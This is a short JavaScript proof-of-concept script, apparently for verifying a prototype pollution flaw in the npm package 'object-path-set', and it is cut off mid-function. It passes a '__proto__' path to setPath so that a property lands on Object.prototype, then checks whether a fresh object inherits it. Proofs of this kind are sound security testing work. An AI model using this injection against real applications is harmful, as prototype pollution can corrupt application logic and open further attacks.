async function exploit() {
  // Load the package and safely resolve the target function regardless of export style
  const objectPathSet = require('object-path-set');
  const setPath = typeof objectPathSet === 'function' 
    ? objectPathSet 
    : (objectPathSet.setPath || objectPathSet.default);

  if (typeof setPath !== 'function') {
    throw new Error('Unable to resolve the setPath function from object-path-set');
  }

  // Base object to initiate traversal
  const obj = {};

  // Trigger prototype pollution via '__proto__' path key.
  // In unpatched versions, the library blindly performs obj['__proto__']['exploited'] = value.
  // Because '__proto__' is a special accessor in JavaScript that points to Object.prototype,
  // this assignment mutates the global prototype chain instead of creating a local property.
  setPath(obj, ['__proto__', 'exploited'], true);

  // Verification: Check if a fresh plain object inherits the injected property.
  if ({}.exploited === true) {
    console.log('[PoC] SUCCESS: Prototype successfully polluted.');
  } else {
    throw new Error('Prototype pollution failed to manifest. The package may be patched or the runtime environment applies stricter prototype safety checks.');
